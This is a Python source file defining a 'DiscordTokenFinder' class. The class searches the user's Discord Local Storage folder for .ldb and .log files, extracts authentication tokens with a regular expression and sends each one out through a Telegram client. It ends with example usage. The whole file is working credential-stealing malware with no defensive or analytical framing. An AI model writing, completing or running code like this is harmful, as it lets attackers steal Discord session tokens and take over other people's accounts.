import os
import re
from typing import List

class DiscordTokenFinder:
    def __init__(self, telegram):
        self.telegram = telegram
        self.token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')

    def find_discord_path(self) -> str:
        # This path might need to be adjusted based on the operating system
        home = os.path.expanduser("~")
        discord_paths = [
            os.path.join(home, ".config/discord/Local Storage"),
            os.path.join(home, "AppData/Local/Discord/Local Storage")
        ]
        
        for path in discord_paths:
            if os.path.exists(path):
                return path
        return ""

    def search_for_tokens(self) -> List[str]:
        path = self.find_discord_path()
        if not path:
            self.telegram.sendText("Discord path not found.")
            return []

        ldb_files = [f for f in os.listdir(path) if f.endswith('.ldb') or f.endswith('.log')]
        tokens = []

        for file in ldb_files:
            file_path = os.path.join(path, file)
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    found_tokens = self.token_pattern.findall(content)
                    tokens.extend(found_tokens)
                    for token in found_tokens:
                        print(f"Found token: {token}")
                        self.telegram.sendText(f"Found token: {token}")
            except Exception as e:
                print(f"Error reading {file_path}: {e}")

        return tokens

# Example usage:
# telegram = SomeTelegramClient()  # This should be your telegram client object
# finder = DiscordTokenFinder(telegram)
# finder.search_for_tokens()